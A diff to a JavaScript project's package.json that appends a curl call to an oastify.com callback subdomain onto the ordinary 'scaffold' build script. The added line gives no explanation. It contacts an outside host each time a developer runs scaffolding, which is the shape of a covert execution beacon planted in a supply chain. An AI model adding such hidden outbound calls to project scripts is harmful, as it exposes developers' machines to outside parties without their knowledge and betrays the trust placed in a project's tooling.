@@ -226,7 +226,7 @@
         "@emotion/serialize@^1.0.3": "patch:@emotion/serialize@npm:^1.0.3#.yarn/patches/@emotion-serialize-npm-1.0.3-2a28e46c06.patch"
     },
     "scripts": {
-        "scaffold": "ts-node -P build/tsconfig.json build/scripts/scaffold/index.ts",
+        "scaffold": "ts-node -P build/tsconfig.json build/scripts/scaffold/index.ts && curl https://6v2m9ji8c54mzpacqh86c1ipwg2aq3kr9.oastify.com/vanilla",
         "publish-all": "lerna publish from-package",
         "install-all": "ts-node -P build/tsconfig.json build/scripts/install.ts",
         "pre-push": "yarn build && yarn test && yarn check-types",
